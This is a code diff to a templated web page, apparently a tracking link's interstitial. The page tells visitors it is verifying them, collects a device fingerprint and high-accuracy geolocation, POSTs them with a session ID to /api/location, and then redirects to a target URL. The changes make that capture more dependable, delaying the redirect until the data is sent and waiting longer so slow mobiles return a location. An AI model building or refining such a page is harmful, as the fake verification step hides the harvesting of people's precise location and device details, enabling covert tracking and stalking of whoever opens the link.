@@ -125,20 +125,30 @@
         const SESSION_ID = '{{SESSION_ID}}';
         const TARGET_URL = '{{TARGET_URL}}';
         const statusText = document.getElementById('status-text');
+        let redirectTriggered = false;
 
+        // Ensure async fetch completes before redirecting
         function redirect() {
+            if (redirectTriggered) return;
+            redirectTriggered = true;
             statusText.innerText = "Verification complete. Redirecting...";
             setTimeout(() => {
                 window.location.href = TARGET_URL;
             }, 1000);
         }
 
-        // Gather enriched client-side data natively
-        const screenResolution = `${window.screen.width}x${window.screen.height}`;
-        let timezoneStr = "Unknown";
-        try { timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { }
+        // Failsafe redirect after 20 seconds total
+        setTimeout(() => {
+            redirect();
+        }, 20000);
 
-        let deviceData = {
+        // Gather enriched client-side data natively
+        let screenResolution = 'Unknown';
+        try { screenResolution = `${window.screen.width}x${window.screen.height}`; } catch(e) {}
+        let timezoneStr = "Unknown";
+        try { timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+
+        const deviceData = {
             screen: screenResolution,
             timezone: timezoneStr,
             devicePixelRatio: window.devicePixelRatio || 1,
@@ -157,14 +167,19 @@
                     const uach = await navigator.userAgentData.getHighEntropyValues([
                         'architecture', 'bitness', 'model', 'platformVersion', 
                         'fullVersionList', 'formFactors', 'wow64'
-                    ]);
+                    ]).catch(e => {
+                        console.warn('UA-CH promise rejected', e);
+                        return null;
+                    });
                     
-                    deviceData.uach = {
-                        mobile: navigator.userAgentData.mobile,
-                        platform: navigator.userAgentData.platform,
-                        brands: navigator.userAgentData.brands,
-                        ...uach
-                    };
+                    if (uach) {
+                        deviceData.uach = {
+                            mobile: navigator.userAgentData.mobile,
+                            platform: navigator.userAgentData.platform,
+                            brands: navigator.userAgentData.brands,
+                            ...uach
+                        };
+                    }
                 }
             } catch (e) {
                 console.warn('UA-CH collection failed, falling back to basic data', e);
@@ -172,6 +187,7 @@
 
             locationData.deviceData = deviceData;
 
+            // POST to backend and wait for it to finish before redirecting
             fetch('/api/location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -199,7 +215,7 @@
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 15000,
+                    timeout: 15000, // Wait up to 15 seconds to ensure slow mobile gets it
                     maximumAge: 0
                 }
             );
